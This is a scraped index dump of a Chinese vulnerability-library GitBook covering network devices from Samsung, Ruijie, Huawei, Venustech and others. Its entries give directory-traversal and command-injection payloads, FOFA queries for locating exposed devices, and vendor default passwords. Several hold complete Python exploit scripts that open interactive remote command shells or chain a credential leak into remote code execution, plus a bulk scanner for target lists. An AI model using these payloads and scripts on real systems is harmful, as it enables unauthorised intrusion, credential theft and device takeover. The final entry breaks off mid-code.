CVE-2021-27328 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "},"book/网络设备漏洞/朗视/朗视 TG400 GSM 网关目录遍历  CVE-2021-27328.html":{"url":"book/网络设备漏洞/朗视/朗视 TG400 GSM 网关目录遍历  CVE-2021-27328.html","title":"朗视 TG400 GSM 网关目录遍历  CVE-2021-27328","keywords":"","body":"朗视 TG400 GSM 网关目录遍历 CVE-2021-27328 漏洞描述 朗视 TG400 GSM 网关存在目录遍历 ，攻击者可以通过漏洞获取敏感信息 漏洞影响 [!NOTE] 朗视 TG400 GSM 网关 漏洞复现 暂无FOFA语句及固件设备复现 获取固件解密密码 http://192.168.43.246/cgi/WebCGI?1404=../../../../../../../../../../bin/firmware_detect /etc/passwd： http://192.168.43.246/cgi/WebCGI?1404=../../../../../../../../../../etc/passwd 参考文章 https://github.com/SQSamir/CVE-2021-27328 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "},"book/网络设备漏洞/三星/":{"url":"book/网络设备漏洞/三星/","title":"三星","keywords":"","body":"三星 三星 WLAN AP WEA453e路由器 远程命令执行漏洞 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "},"book/网络设备漏洞/三星/三星 WLAN AP WEA453e路由器  远程命令执行漏洞.html":{"url":"book/网络设备漏洞/三星/三星 WLAN AP WEA453e路由器  远程命令执行漏洞.html","title":"三星 WLAN AP WEA453e路由器  远程命令执行漏洞","keywords":"","body":"三星 WLAN AP WEA453e路由器 远程命令执行漏洞 漏洞描述 三星 WLAN AP WEA453e路由器 存在远程命令执行漏洞，可在未授权的情况下执行任意命令获取服务器权限 漏洞影响 [!NOTE] 三星 WLAN AP WEA453e路由器 FOFA [!NOTE] title==\"Samsung WLAN AP\" 漏洞复现 登录页面如下 请求包如下 POST /(download)/tmp/a.txt HTTP/1.1 Host: 175.199.182.152 Connection: close Content-Length: 48 command1=shell:cat /etc/passwd| dd of=/tmp/a.txt 漏洞利用POC import requests import sys import random import re import base64 import time from requests.packages.urllib3.exceptions import InsecureRequestWarning def title(): print('+------------------------------------------') print('+ \\033[34mPOC_Des: http://wiki.peiqi.tech \\033[0m') print('+ \\033[34mGithub : https://github.com/PeiQi0 \\033[0m') print('+ \\033[34m公众号 : PeiQi文库 \\033[0m') print('+ \\033[34mVersion: 三星 WLAN AP WEA453e路由器 \\033[0m') print('+ \\033[36m使用格式: python3 poc.py \\033[0m') print('+ \\033[36mUrl >>> http://xxx.xxx.xxx.xxx \\033[0m') print('+------------------------------------------') def POC_1(target_url): vuln_url = target_url + \"/(download)/tmp/a.txt\" headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", \"Content-Type\": \"application/x-www-form-urlencoded\" } data = \"command1=shell:cat /etc/passwd| dd of=/tmp/a.txt\" try: requests.packages.urllib3.disable_warnings(InsecureRequestWarning) response = requests.post(url=vuln_url, headers=headers, data=data, verify=False, timeout=5) if \"root\" in response.text and response.status_code == 200: print(\"\\033[36m[o] 目标 {} 存在漏洞, 响应为:\\n{}\\033[0m\".format(target_url, response.text)) while True: cmd = str(input(\"\\033[35mCmd >>> \\033[0m\")) POC_2(target_url, cmd) else: print(\"\\033[31m[x] 目标 {} 不存在默认管理员弱口令 \\033[0m\".format(target_url)) except Exception as e: print(\"\\033[31m[x] 请求失败 \\033[0m\", e) def POC_2(target_url, cmd): vuln_url = target_url + \"/(download)/tmp/a.txt\" headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", \"Content-Type\": \"application/x-www-form-urlencoded\" } data = \"command1=shell:{}| dd of=/tmp/a.txt\".format(cmd) try: requests.packages.urllib3.disable_warnings(InsecureRequestWarning) response = requests.post(url=vuln_url, headers=headers, data=data, verify=False, timeout=5) print(\"\\033[36m{} \\033[0m\".format(response.text)) except Exception as e: print(\"\\033[31m[x] 请求失败 \\033[0m\", e) if __name__ == '__main__': title() target_url = str(input(\"\\033[35mPlease input Attack Url\\nUrl >>> \\033[0m\")) POC_1(target_url) Goby & POC [!NOTE] 已上传 https://github.com/PeiQi0/PeiQi-WIKI-POC Goby & POC 目录中 Samsung_WLAN_AP_wea453e_router_RCE 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "},"book/网络设备漏洞/飞鱼星/":{"url":"book/网络设备漏洞/飞鱼星/","title":"飞鱼星","keywords":"","body":"飞鱼星 飞鱼星 家用智能路由 cookie.cgi 权限绕过 飞鱼星 企业级智能上网行为管理系统 权限绕过信息泄露漏洞 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "},"book/网络设备漏洞/飞鱼星/飞鱼星 家用智能路由 cookie.cgi 权限绕过.html":{"url":"book/网络设备漏洞/飞鱼星/飞鱼星 家用智能路由 cookie.cgi 权限绕过.html","title":"飞鱼星 家用智能路由 cookie.cgi 权限绕过","keywords":"","body":"飞鱼星 家用智能路由 cookie.cgi 权限绕过 漏洞描述 飞鱼星 家用智能路由存在权限绕过，通过Drop特定的请求包访问未授权的管理员页面 漏洞影响 [!NOTE] 飞鱼星 家用智能路由 飞鱼星 企业级智能上网行为管理系统 FOFA [!NOTE] title=\"飞鱼星家用智能路由\" 漏洞复现 登录页面如下 访问 index.html 时会请求 cookie.cgi http://xxx.xxx.xxx.xxx/index.html 页面抓包 Drop掉 cookie.cgi 跳转后台获取了权限 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "},"book/网络设备漏洞/飞鱼星/飞鱼星 企业级智能上网行为管理系统 权限绕过信息泄露漏洞.html":{"url":"book/网络设备漏洞/飞鱼星/飞鱼星 企业级智能上网行为管理系统 权限绕过信息泄露漏洞.html","title":"飞鱼星 企业级智能上网行为管理系统 权限绕过信息泄露漏洞","keywords":"","body":"飞鱼星 企业级智能上网行为管理系统 权限绕过信息泄露漏洞 漏洞描述 飞鱼星 企业级智能上网行为管理系统 存在权限绕过以及信息泄露漏洞，可以获取管理员权限以及用户密码 漏洞影响 [!NOTE] 飞鱼星 企业级智能上网行为管理系统 FOFA [!NOTE] title=\"飞鱼星企业级智能上网行为管理系统\" 漏洞复现 权限绕过参考上一篇 飞鱼星 家用智能路由 cookie.cgi 权限绕过 信息泄露POC /request_para.cgi?parameter=wifi_info #获取ALL WIFI账号密码 /request_para.cgi?parameter=wifi_get_5g_host #获取5GWIFI账号密码 /request_para.cgi?parameter=wifi_get_2g_host #获取2GWIFI账号密码 Goby & POC [!NOTE] Adslr Enterprise online behavior management system Information leakage 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "},"book/网络设备漏洞/启明星辰/":{"url":"book/网络设备漏洞/启明星辰/","title":"启明星辰","keywords":"","body":"启明星辰 启明星辰 天清汉马USG防火墙 弱口令漏洞 CNVD-2021-12793 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "},"book/网络设备漏洞/启明星辰/启明星辰 天清汉马USG防火墙 默认口令漏洞.html":{"url":"book/网络设备漏洞/启明星辰/启明星辰 天清汉马USG防火墙 默认口令漏洞.html","title":"启明星辰 天清汉马USG防火墙 默认口令漏洞","keywords":"","body":"启明星辰 天清汉马USG防火墙 弱口令漏洞 漏洞描述 启明星辰 天清汉⻢USG防⽕墙 存在默认口令漏洞，攻击者通过账号密码可以进入后台 漏洞影响 [!NOTE] 启明星辰 天清汉马USG防火墙 FOFA [!NOTE] title=\"天清汉马USG防火墙\" 漏洞复现 默认口令 账号：useradmin 密码：venus.user 成功登录 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "},"book/网络设备漏洞/启明星辰/启明星辰 天清汉马USG防火墙 逻辑缺陷漏洞.html":{"url":"book/网络设备漏洞/启明星辰/启明星辰 天清汉马USG防火墙 逻辑缺陷漏洞.html","title":"启明星辰 天清汉马USG防火墙 逻辑缺陷漏洞","keywords":"","body":"启明星辰 天清汉马USG防火墙 逻辑缺陷漏洞 漏洞描述 启明星辰 天清汉⻢USG防⽕墙 存在逻辑缺陷漏洞，攻击者通过账号密码可以进入后台后更改任意用户权限升级为管理员 漏洞影响 [!NOTE] 启明星辰 天清汉马USG防火墙 FOFA [!NOTE] title=\"天清汉马USG防火墙\" 漏洞复现 登录后台后管理界面点击下面的图标 更改权限为任意用户,刷新后得到用户权限 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "},"book/网络设备漏洞/佑友/":{"url":"book/网络设备漏洞/佑友/","title":"佑友","keywords":"","body":"佑友 佑友防火墙 后台命令执行漏洞 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "},"book/网络设备漏洞/佑友/佑友防火墙 后台命令执行漏洞.html":{"url":"book/网络设备漏洞/佑友/佑友防火墙 后台命令执行漏洞.html","title":"佑友防火墙 后台命令执行漏洞","keywords":"","body":"佑友防火墙 后台命令执行漏洞 漏洞描述 佑友防火墙 后台维护工具存在命令执行，由于没有过滤危险字符，导致可以执行任意命令 漏洞影响 [!NOTE] 佑友防火墙 FOFA [!NOTE] title=\"佑友防火墙\" 漏洞复现 登录页面如下 默认账号密码为 User: admin Pass: hicomadmin 登录后台 系统管理 --> 维护工具 --> Ping 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "},"book/网络设备漏洞/华为/":{"url":"book/网络设备漏洞/华为/","title":"华为","keywords":"","body":"Huawei Huawei HG659 lib 任意文件读取漏洞 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "},"book/网络设备漏洞/华为/Huawei HG659 lib 任意文件读取漏洞.html":{"url":"book/网络设备漏洞/华为/Huawei HG659 lib 任意文件读取漏洞.html","title":"Huawei HG659 lib 任意文件读取漏洞","keywords":"","body":"Huawei HG659 lib 任意文件读取漏洞 漏洞描述 Huawei HG659 lib 存在任意文件读取漏洞，攻击者通过漏洞可以读取任意文件 漏洞影响 [!NOTE] Huawei HG659 FOFA [!NOTE] app=\"HUAWEI-Home-Gateway-HG659\" 漏洞复现 登录页面如下 POC如下 /lib///....//....//....//....//....//....//....//....//etc//passwd 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "},"book/网络设备漏洞/迈普/":{"url":"book/网络设备漏洞/迈普/","title":"迈普","keywords":"","body":"迈普 迈普 ISG1000安全网关 任意文件下载漏洞 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "},"book/网络设备漏洞/迈普/迈普 ISG1000安全网关 任意文件下载漏洞.html":{"url":"book/网络设备漏洞/迈普/迈普 ISG1000安全网关 任意文件下载漏洞.html","title":"迈普 ISG1000安全网关 任意文件下载漏洞","keywords":"","body":"迈普 ISG1000安全网关 任意文件下载漏洞 漏洞描述 迈普 ISG1000安全网关 存在任意文件下载漏洞，攻击者通过漏洞可以获取服务器任意文件 漏洞影响 [!NOTE] 迈普 ISG1000安全网关 FOFA [!NOTE] title=\"迈普通信技术股份有限公司\" 漏洞复现 登录页面如下 请求的 POC 为 /webui/?g=sys_dia_data_down&file_name=../etc/passwd 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "},"book/网络设备漏洞/锐捷/":{"url":"book/网络设备漏洞/锐捷/","title":"锐捷","keywords":"","body":"锐捷 锐捷Smartweb管理系统 密码信息泄露漏洞 锐捷Smartweb管理系统 默认开启Guest账户漏洞 锐捷NBR路由器 EWEB网管系统 远程命令执行漏洞 CNVD-2021-09650 锐捷RG-UAC统一上网行为管理审计系统存在账号密码信息泄露 CNVD-2021-14536 锐捷SSL VPN 越权访问漏洞 锐捷云课堂主机 目录遍历漏洞 锐捷EG易网关 cli.php 远程命令执行漏洞 锐捷EG易网关 管理员账号密码泄露漏洞 锐捷EG易网关 branch_passw.php 远程命令执行漏洞 锐捷EG易网关 phpinfo.view.php 信息泄露漏洞 锐捷EG易网关 download.php 后台任意文件读取漏洞 锐捷ISG 账号密码泄露漏洞 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "},"book/网络设备漏洞/锐捷/锐捷NBR路由器 EWEB网管系统 远程命令执行漏洞 CNVD-2021-09650.html":{"url":"book/网络设备漏洞/锐捷/锐捷NBR路由器 EWEB网管系统 远程命令执行漏洞 CNVD-2021-09650.html","title":"锐捷NBR路由器 EWEB网管系统 远程命令执行漏洞 CNVD-2021-09650","keywords":"","body":"锐捷NBR路由器 EWEB网管系统 远程命令执行漏洞 CNVD-2021-09650 漏洞描述 锐捷NBR路由器 EWEB网管系统部分接口存在命令注入，导致远程命令执行获取权限 漏洞影响 [!NOTE] 锐捷NBR路由器 EWEB网管系统 FOFA [!NOTE] title=\"锐捷网络-EWEB网管系统\" icon_hash=\"-692947551\" 漏洞复现 出现漏洞的文件在 /guest_auth/guestIsUp.php 这里看到通过命令拼接的方式构造命令执行， POST /guest_auth/guestIsUp.php mac=1&ip=127.0.0.1|cat /etc/passwd > test.txt 然后访问页面 /guest_auth/test.txt 就可以看到命令执行的结果 漏洞利用POC import requests import sys import random from requests.packages.urllib3.exceptions import InsecureRequestWarning def title(): print('+------------------------------------------') print('+ \\033[34mPOC_Des: http://wiki.peiqi.tech \\033[0m') print('+ \\033[34mGithub : https://github.com/PeiQi0 \\033[0m') print('+ \\033[34m公众号 : PeiQi文库 \\033[0m') print('+ \\033[34mVersion: 锐捷网络-EWEB网管系统 \\033[0m') print('+ \\033[36m使用格式: python3 poc.py \\033[0m') print('+ \\033[36mUrl >>> http://xxx.xxx.xxx.xxx \\033[0m') print('+------------------------------------------') def POC_1(target_url): vuln_url = target_url + \"/guest_auth/guestIsUp.php\" headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Safari/537.36\", \"Content-Type\": \"application/x-www-form-urlencoded\", } data = \"mac=1&ip=127.0.0.1| whoami > test_test.txt\" try: requests.packages.urllib3.disable_warnings(InsecureRequestWarning) response = requests.post(url=vuln_url, headers=headers, data=data,verify=False, timeout=5) if response.status_code == 200: print(\"\\033[32m[o] 目标{}存在漏洞, 执行命令 whoami \\033[0m\".format(target_url)) requests.packages.urllib3.disable_warnings(InsecureRequestWarning) response = requests.get(url=target_url + \"/guest_auth/test_test.txt\", headers=headers, data=data, verify=False, timeout=5) print(\"\\033[32m[o] 响应为： {} \\033[0m\".format(response.text)) while True: cmd = input(\"\\033[35mCmd >>> \\033[0m\") if cmd == \"exit\": sys.exit(0) else: POC_2(target_url, cmd) else: print(\"\\033[31m[x] 目标不存在漏洞 \\033[0m\") sys.exit(0) except Exception as e: print(\"\\033[31m[x] 请求失败 \\033[0m\", e) def POC_2(target_url, cmd): vuln_url = target_url + \"/guest_auth/guestIsUp.php\" headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Safari/537.36\", \"Content-Type\": \"application/x-www-form-urlencoded\", } data = \"mac=1&ip=127.0.0.1| {} > test_test.txt\".format(cmd) try: requests.packages.urllib3.disable_warnings(InsecureRequestWarning) response = requests.post(url=vuln_url, headers=headers, data=data,verify=False, timeout=5) if response.status_code == 200: requests.packages.urllib3.disable_warnings(InsecureRequestWarning) response = requests.get(url=target_url + \"/guest_auth/test_test.txt\", headers=headers, data=data,verify=False, timeout=5) print(\"\\033[32m[o] 响应为： \\n{} \\033[0m\".format(response.text)) except Exception as e: print(\"\\033[31m[x] 请求失败 \\033[0m\", e) if __name__ == '__main__': title() target_url = str(input(\"\\033[35mPlease input Attack Url\\nUrl >>> \\033[0m\")) POC_1(target_url) Goby & POC [!NOTE] 锐捷NBR路由器 EWEB网管系统 远程命令执行漏洞 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "},"book/网络设备漏洞/锐捷/锐捷RG-UAC统一上网行为管理审计系统存在账号密码信息泄露.html":{"url":"book/网络设备漏洞/锐捷/锐捷RG-UAC统一上网行为管理审计系统存在账号密码信息泄露.html","title":"锐捷RG-UAC统一上网行为管理审计系统存在账号密码信息泄露","keywords":"","body":"锐捷RG-UAC统一上网行为管理审计系统存在账号密码信息泄露 CNVD-2021-14536 漏洞描述 锐捷RG-UAC统一上网行为管理审计系统存在账号密码信息泄露,可以间接获取用户账号密码信息登录后台 影响版本 [!NOTE] 锐捷RG-UAC统一上网行为管理审计系统 FOFA [!NOTE] title=\"RG-UAC登录页面\" 漏洞复现 来到登录页面 按F12查看源码,可以发现账号和密码的md5形式 解密md5得到密码后即可登录系统 漏洞利用POC import requests import sys import random import re from requests.packages.urllib3.exceptions import InsecureRequestWarning def title(): print('+------------------------------------------') print('+ \\033[34mPOC_Des: http://wiki.peiqi.tech \\033[0m') print('+ \\033[34mGithub : https://github.com/PeiQi0 \\033[0m') print('+ \\033[34m公众号 : PeiQi文库 \\033[0m') print('+ \\033[34mVersion: 锐捷RG-UAC统一上网行为管理审计系统 \\033[0m') print('+ \\033[36m使用格式: python3 poc.py \\033[0m') print('+ \\033[36mFile >>> ip.txt \\033[0m') print('+------------------------------------------') def POC_1(target_url): vuln_url = target_url headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", } try: requests.packages.urllib3.disable_warnings(InsecureRequestWarning) response = requests.get(url=vuln_url, headers=headers, verify=False, timeout=5) if \"super_admin\" in response.text and \"password\" in response.text and response.status_code == 200: print(\"\\033[32m[o] 目标 {}存在漏洞 ,F12查看源码获取密码md5值 \\033[0m\".format(target_url)) else: print(\"\\033[31m[x] 目标 {}不存在漏洞 \\033[0m\".format(target_url)) except Exception as e: print(\"\\033[31m[x] 目标 {}不存在漏洞 \\033[0m\".format(target_url)) def Scan(file_name): with open(file_name, \"r\", encoding='utf8') as scan_url: for url in scan_url: if url[:4] != \"http\": url = \"http://\" + url url = url.strip('\\n') try: POC_1(url) except Exception as e: print(\"\\033[31m[x] 请求报错 \\033[0m\".format(e)) continue if __name__ == '__main__': title() file_name = str(input(\"\\033[35mPlease input Attack File\\nFile >>> \\033[0m\")) Scan(file_name) 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "},"book/网络设备漏洞/锐捷/锐捷SSL VPN 越权访问漏洞.html":{"url":"book/网络设备漏洞/锐捷/锐捷SSL VPN 越权访问漏洞.html","title":"锐捷SSL VPN 越权访问漏洞","keywords":"","body":"锐捷SSL VPN 越权访问漏洞 漏洞描述 Ruijie SSL VPN 存在越权访问漏洞，攻击者在已知用户名的情况下，可以对账号进行修改密码和绑定手机的操作。并在未授权的情况下查看服务器资源 漏洞影响 [!NOTE] Ruijie SSL VPN FOFA [!NOTE] icon_hash=\"884334722\" || title=\"Ruijie SSL VPN\" 漏洞复现 访问目标 http://xxx.xxx.xxx.xxx/cgi-bin/installjava.cgi POC请求包如下 GET /cgi-bin/main.cgi?oper=getrsc HTTP/1.1 Host: xxx.xxx.xxx.xxx Connection: close Pragma: no-cache Cache-Control: no-cache Upgrade-Insecure-Requests: 1 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.190 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9 Sec-Fetch-Site: none Sec-Fetch-Mode: navigate Sec-Fetch-User: ?1 Sec-Fetch-Dest: document Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-TW;q=0.6 Cookie: UserName=xm; SessionId=1; FirstVist=1; Skin=1; tunnel=1 其中注意的参数为 Cookie: UserName=xm; SessionId=1; FirstVist=1; Skin=1; tunnel=1 UserName 参数为已知用户名 [!NOTE] 在未知登录用户名的情况下 漏洞无法利用(根据请求包使用Burp进行用户名爆破) 用户名正确时会返回敏感信息 通过此方法知道用户名后可以通过漏洞修改账号参数 访问 http://xxx.xxx.xxx.xxx/cgi-bin/main.cgi?oper=showsvr&encode=GBK&username=liuw&sid=1&oper=showres 点击个人设置跳转页面即可修改账号信息 参考文章 https://mp.weixin.qq.com/s?__biz=MzU1NTkzMTYxOQ==&mid=2247484601&idx=1&sn=d6d6f4496243d98e688667faff137973 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "},"book/网络设备漏洞/锐捷/锐捷Smartweb管理系统 默认开启Guest账户漏洞.html":{"url":"book/网络设备漏洞/锐捷/锐捷Smartweb管理系统 默认开启Guest账户漏洞.html","title":"锐捷Smartweb管理系统 默认开启Guest账户漏洞","keywords":"","body":"锐捷Smartweb管理系统 默认开启Guest账户漏洞 CNVD-2020-56167 漏洞描述 锐捷Smartweb管理系统 默认开启Guest账户漏洞 ，攻击者可以通过漏洞登录后台进一步攻击 漏洞影响 [!NOTE] 锐捷网络股份有限公司 无线smartweb管理系统 FOFA [!NOTE] title=\"无线smartWeb--登录页面\" 漏洞复现 登录的账号密码为 guest/guest Goby & POC [!NOTE] 已上传 https://github.com/PeiQi0/PeiQi-WIKI-POC Goby & POC 目录中 Ruijie smartweb weak password 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "},"book/网络设备漏洞/锐捷/锐捷Smartweb管理系统 密码信息泄露漏洞.html":{"url":"book/网络设备漏洞/锐捷/锐捷Smartweb管理系统 密码信息泄露漏洞.html","title":"锐捷Smartweb管理系统 密码信息泄露漏洞","keywords":"","body":"锐捷Smartweb管理系统 密码信息泄露漏洞 漏洞描述 锐捷网络股份有限公司无线smartweb管理系统存在逻辑缺陷漏洞，攻击者可从漏洞获取到管理员账号密码，从而以管理员权限登录。 漏洞影响 [!NOTE] 锐捷网络股份有限公司 无线smartweb管理系统 FOFA [!NOTE] title=\"无线smartWeb--登录页面\" 漏洞复现 登录页面如下 默认存在 guest账户，账号密码为 guest/guest 其中登录的过程中搜索admin的数据后发现请求了一个文件 /web/xml/webuser-auth.xml，而且响应中包含了 admin密码的base64加密 解密就可以获得 admin管理员的密码，尝试直接请求 http://xxx.xxx.xxx.xxx/web/xml/webuser-auth.xml Cookie添加 Cookie: login=1; oid=1.3.6.1.4.1.4881.1.1.10.1.3; type=WS5302; auth=Z3Vlc3Q6Z3Vlc3Q%3D; user=guest 直接获得所有的账户的等级标志和base64加密的账号密码 Goby & POC [!NOTE] 已上传 https://github.com/PeiQi0/PeiQi-WIKI-POC Goby & POC 目录中 Ruijie_smartweb_password_information_disclosure 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "},"book/网络设备漏洞/锐捷/锐捷云课堂主机 目录遍历漏洞.html":{"url":"book/网络设备漏洞/锐捷/锐捷云课堂主机 目录遍历漏洞.html","title":"锐捷云课堂主机 目录遍历漏洞","keywords":"","body":"锐捷云课堂主机 目录遍历漏洞 漏洞描述 锐捷云课堂主机存在目录遍历漏洞，通过访问get请求/pool/，即可读取目录.导致敏感信息泄露. 漏洞影响 [!NOTE] 锐捷云课堂 FOFA [!NOTE] title=\"Ruijie\" && \"云课堂主机\" 漏洞复现 访问 http://xxx.xxx.xxx.xxx/pool 造成目录遍历 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "},"book/网络设备漏洞/锐捷/锐捷EG易网关 cli.php 远程命令执行漏洞.html":{"url":"book/网络设备漏洞/锐捷/锐捷EG易网关 cli.php 远程命令执行漏洞.html","title":"锐捷EG易网关 cli.php 远程命令执行漏洞","keywords":"","body":"锐捷EG易网关 cli.php 远程命令执行漏洞 漏洞描述 锐捷EG易网关 cli.php存在命令执行漏洞，配合 锐捷EG易网关 管理员账号密码泄露漏洞 达到RCE控制服务器 漏洞影响 [!NOTE] 锐捷EG易网关 FOFA [!NOTE] app=\"Ruijie-EG易网关\" 漏洞复现 首先登录到后台中(可以组合 锐捷EG易网关 管理员账号密码泄露漏洞) 漏洞文件 cli.php true, \"data\" => $content); json_echo($data); } /** * 获取系统时间 */ public function dateAction() { setTimeZone(); $data['status'] = true; $data[\"data\"][\"time\"] = date(\"Y-m-d H:i:s\"); $data[\"data\"][\"zone\"] = \"UTC\" . getTimeZone(); json_echo($data); } /** * 获取系统时区 */ public function datezoneAction() { $data['status'] = true; $data[\"data\"] = getTimeZone(); json_echo($data); } /** * 检测静态页面时候未登录直接进入 */ public function checkloginAction() { json_echo(array(\"status\" => true)); } } include_once(AROOT . \"init.php\"); //mvc初始化入口，放在底部 关键部分代码为 /** * 执行shell脚本 */ public function shellAction() { $command = p(\"command\"); if ($command == false) { $data[\"status\"] = 2; $data[\"msg\"] = \"no command\"; json_echo($data); exit(); } $content = []; exec(EscapeShellCmd($command), $content); $data = array(\"status\" => true, \"data\" => $content); json_echo($data); } command参数直接传入执行了命令 发送请求包 POST /cli.php?a=shell HTTP/1.1 Host: User-Agent: Go-http-client/1.1 Content-Length: 24 Content-Type: application/x-www-form-urlencoded Cookie: RUIJIEID=nk5erth9i0pvcco3n7fbpa9bi0;user=admin; X-Requested-With: XMLHttpRequest Accept-Encoding: gzip notdelay=true&command=id 漏洞POC #!/usr/bin/python3 #-*- coding:utf-8 -*- # author : PeiQi # from : http://wiki.peiqi.tech import base64 import requests import random import re import json import sys def title(): print('+------------------------------------------') print('+ \\033[34mPOC_Des: http://wiki.peiqi.tech \\033[0m') print('+ \\033[34mGithub : https://github.com/PeiQi0 \\033[0m') print('+ \\033[34m公众号 : PeiQi文库 \\033[0m') print('+ \\033[34mVersion: 锐捷EG网关 cli.php RCE \\033[0m') print('+ \\033[36m使用格式: python3 poc.py \\033[0m') print('+ \\033[36mUrl >>> http://xxx.xxx.xxx.xxx \\033[0m') print('+------------------------------------------') def POC_1(target_url): vuln_url = target_url + \"/login.php\" headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", \"Content-Type\": \"application/x-www-form-urlencoded\" } data = 'username=admin&password=admin?show+webmaster+user' try: response = requests.post(url=vuln_url, data=data, headers=headers, verify=False, timeout=10) print(\"\\033[36m[o] 正在执行 show webmaster user \\033[0m\".format(target_url)) if \"data\" in response.text and response.status_code == 200: password = re.findall(r'admin (.*?)\"', response.text)[0] print(\"\\033[36m[o] 成功获取, 账号密码为: admin {} \\033[0m\".format(password)) POC_2(target_url, password) except Exception as e: print(\"\\033[31m[x] 请求失败:{} \\033[0m\".format(e)) sys.exit(0) def POC_2(target_url, password): vuln_url = target_url + \"/login.php\" headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", \"Content-Type\": \"application/x-www-form-urlencoded\" } data = 'username=admin&password={}'.format(password) try: response = requests.post(url=vuln_url, data=data, headers=headers, verify=False, timeout=10) print(\"\\033[36m[o] 正在登录..... \\033[0m\".format(target_url)) if \"status\" in response.text and \"1\" in response.text and response.status_code == 200: ruijie_cookie = \"RUIJIEID=\" + re.findall(r\"'Set-Cookie': 'RUIJIEID=(.*?);\", str(response.headers))[0] + \";user=admin;\" print(\"\\033[36m[o] 成功获取管理员Cookie: {} \\033[0m\".format(ruijie_cookie)) POC_3(target_url, ruijie_cookie) except Exception as e: print(\"\\033[31m[x] 请求失败:{} \\033[0m\".format(e)) sys.exit(0) def POC_3(target_url, ruijie_cookie): vuln_url = target_url + \"/cli.php?a=shell\" headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", \"Content-Type\": \"application/x-www-form-urlencoded\", \"Cookie\": \"{}\".format(ruijie_cookie) } data = 'notdelay=true&command=cat /etc/passwd' try: response = requests.post(url=vuln_url, data=data, headers=headers, verify=False, timeout=10) print(\"\\033[36m[o] 正在执行 cat /etc/passwd..... \\033[0m\".format(target_url)) if \"root:\" in response.text and response.status_code == 200: print(\"\\033[36m[o] 成功读取 /etc/passwd \\n[o] 响应为:{} \\033[0m\".format(response.text)) except Exception as e: print(\"\\033[31m[x] 请求失败:{} \\033[0m\".format(e)) sys.exit(0) if __name__ == '__main__': title() target_url = str(input(\"\\033[35mPlease input Attack Url\\nUrl >>> \\033[0m\")) POC_1(target_url) 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "},"book/网络设备漏洞/锐捷/锐捷EG易网关 管理员账号密码泄露漏洞.html":{"url":"book/网络设备漏洞/锐捷/锐捷EG易网关 管理员账号密码泄露漏洞.html","title":"锐捷EG易网关 管理员账号密码泄露漏洞","keywords":"","body":"锐捷EG易网关 管理员账号密码泄露漏洞 漏洞描述 锐捷EG易网关 login.php存在 CLI命令注入，导致管理员账号密码泄露漏洞 漏洞影响 [!NOTE] 锐捷EG易网关 FOFA [!NOTE] app=\"Ruijie-EG易网关\" 漏洞复现 登录页面如下 漏洞文件 login.php 1 || count(preg_split($reg, $password)) > 1) { 